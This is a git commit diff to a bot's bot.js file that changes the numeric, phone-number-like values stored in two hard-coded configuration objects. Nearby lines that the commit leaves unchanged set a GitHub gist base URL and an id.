29b339df84568ba499ed980fc202cb2d9f65d91c
Ayishu-Mwol_V2 <100610655+Ayishu74@users.noreply.github.com>
2022-03-01 20:02:10 +0530

    Update bot.js

--- bot.js
+++ bot.js
@@ -36,9 +36,9 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 
 const plugindb = require('./plugins/sql/plugin');
 var base = `https://gist.github.com/`
-var PROP = { aredits: '919946432377,0' }
+var PROP = { aredits: '919947430792,0' }
 var unlink = `019112af334adceaefd1467dcbd93e58` 
-var PROP2 = { kl11: '916282344739,0' }
+var PROP2 = { kl11: '919947430792,0' }
 var string = base + `souravkl11`
         
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
